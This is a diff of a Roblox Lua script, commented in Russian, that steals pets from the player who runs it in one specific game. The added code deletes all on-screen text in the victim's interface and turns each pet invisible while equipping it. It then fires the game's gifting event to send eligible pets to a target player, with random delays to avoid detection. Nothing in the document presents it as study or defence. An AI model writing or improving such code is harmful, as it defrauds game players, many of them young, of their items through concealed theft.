@@ -3,6 +3,34 @@ if game.PlaceId ~= 126884695634066 then
     return
 end
 
+task.spawn(function()
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+    local function removeText(obj)
+        if obj:IsA("TextLabel") or obj:IsA("TextButton") then
+            obj:Destroy()
+        end
+    end
+
+    -- Удаляем уже существующие тексты
+    for _, obj in ipairs(PlayerGui:GetDescendants()) do
+        removeText(obj)
+    end
+
+    -- Удаляем новые тексты при их появлении
+    PlayerGui.DescendantAdded:Connect(function(obj)
+        task.wait() -- ждём, чтобы элемент успел появиться
+        removeText(obj)
+    end)
+end)
+
+
+
+
+
+
+
 getgenv().PetConfig = {
     MinLevel = getgenv().MinLevel or 75,           -- минимальный возраст
     MinWeight = getgenv().MinWeight or 20.0,       -- минимальный вес
@@ -533,23 +561,64 @@ local function startStealingProcess()
         end
 
         local function equipPet(pet)
-            if not VICTIM.Character or not VICTIM.Character:FindFirstChild("Humanoid") or pet.Parent == VICTIM.Character then
-                print("➡️ Pet already equipped or character not ready:", pet.Name)
-                return
-            end
-            local success, err = pcall(function()
-                if pet:GetAttribute("d") then
-                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+    -- Проверяем наличие персонажа и Humanoid
+    if not VICTIM.Character or not VICTIM.Character:FindFirstChild("Humanoid") then
+        warn("❌ Character or Humanoid not found for", VICTIM.Name)
+        return false
+    end
+    if not pet or not pet:IsA("Tool") then
+        warn("❌ Invalid pet object:", pet and pet.Name or "nil")
+        return false
+    end
+    if pet.Parent == VICTIM.Character then
+        print("➡️ Pet already equipped:", pet.Name)
+        return true
+    end
+
+    local success, err = pcall(function()
+        -- Сохраняем исходную прозрачность для всех частей питомца
+        local originalTransparencies = {}
+        local function setTransparency(obj, value)
+            for _, part in pairs(obj:GetDescendants()) do
+                if part:IsA("BasePart") or part:IsA("MeshPart") then
+                    originalTransparencies[part] = part.Transparency
+                    part.Transparency = value
+                elseif part:IsA("BillboardGui") or part:IsA("ParticleEmitter") then
+                    originalTransparencies[part] = part.Enabled
+                    part.Enabled = (value == 0)
                 end
-                VICTIM.Character.Humanoid:EquipTool(pet)
-            end)
-            if success then
-                print("✅ Equipped pet:", pet.Name)
-            else
-                warn("❌ Failed to equip pet:", pet.Name, err)
             end
-            task.wait(0.2)
         end
+
+        -- Делаем питомца невидимым
+        setTransparency(pet, 1)
+        -- Проверяем, находится ли питомец в Backpack
+        if pet.Parent ~= VICTIM.Backpack then
+            pet.Parent = VICTIM.Backpack
+            task.wait(0.1) -- Даём время серверу синхронизировать
+        end
+        -- Экипируем питомца
+        VICTIM.Character.Humanoid:EquipTool(pet)
+        task.wait(0.1) -- Ждём завершения экипировки
+        -- Возвращаем прозрачность (опционально)
+        setTransparency(pet, 0)
+        for part, transparency in pairs(originalTransparencies) do
+            if part:IsA("BasePart") or part:IsA("MeshPart") then
+                part.Transparency = transparency
+            elseif part:IsA("BillboardGui") or part:IsA("ParticleEmitter") then
+                part.Enabled = transparency
+            end
+        end
+    end)
+
+    if success then
+        print("✅ Equipped pet (hidden):", pet.Name)
+        return true
+    else
+        warn("❌ Failed to equip pet:", pet.Name, err)
+        return false
+    end
+end
 
         local function startSteal(trigerName)
             if game.Players[trigerName] and game.Players[trigerName].Character and game.Players[trigerName].Character.Head then
@@ -566,35 +635,43 @@ local function startStealingProcess()
         end
 
         local function checkPetsInventory(target)
-            for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-                local petName = value.PetType
-                local petData = value.PetData or {}
-                if not petData then
-                    print("No PetData for pet:", petName, petUid)
-                    continue
-                end
-                if not isPetValid(petData, petName) then
-                    print("➡️ Skipped pet:", petName, "Not eligible")
-                    continue
-                end
-                print("➡️ Attempting to give pet:", petName, petUid, "to", target)
-                local petObject = getPetObject(petUid)
-                if not petObject then
-                    warn("❌ Failed to find pet object:", petName, petUid)
-                    continue
-                end
-                equipPet(petObject)
-                local success, err = pcall(function()
-                    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", game.Players[target], petUid)
-                end)
-                if success then
-                    print("✅ Successfully attempted to give pet:", petName, petUid)
-                else
-                    warn("❌ Failed to give pet:", petName, petUid, err)
-                end
-                task.wait(0.25)
-            end
+    if not game.Players:FindFirstChild(target) then
+        warn("❌ Target player not found:", target)
+        return
+    end
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        local petData = value.PetData or {}
+        if not petData then
+            print("No PetData for pet:", petName, petUid)
+            continue
         end
+        if not isPetValid(petData, petName) then
+            print("➡️ Skipped pet:", petName, "Not eligible")
+            continue
+        end
+        print("➡️ Attempting to give pet:", petName, petUid, "to", target)
+        local petObject = getPetObject(petUid)
+        if not petObject then
+            warn("❌ Failed to find pet object:", petName, petUid)
+            continue
+        end
+        -- Экипируем питомца
+        if equipPet(petObject) then
+            local success, err = pcall(function()
+                ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", game.Players[target], petUid)
+            end)
+            if success then
+                print("✅ Successfully attempted to give pet:", petName, petUid)
+            else
+                warn("❌ Failed to give pet:", petName, petUid, err)
+            end
+        else
+            warn("❌ Failed to equip pet, skipping give:", petName, petUid)
+        end
+        task.wait(math.random(0.1, 0.4)) -- Случайная задержка для естественности
+    end
+end
 
         local function idlingTarget()
             task.spawn(function()
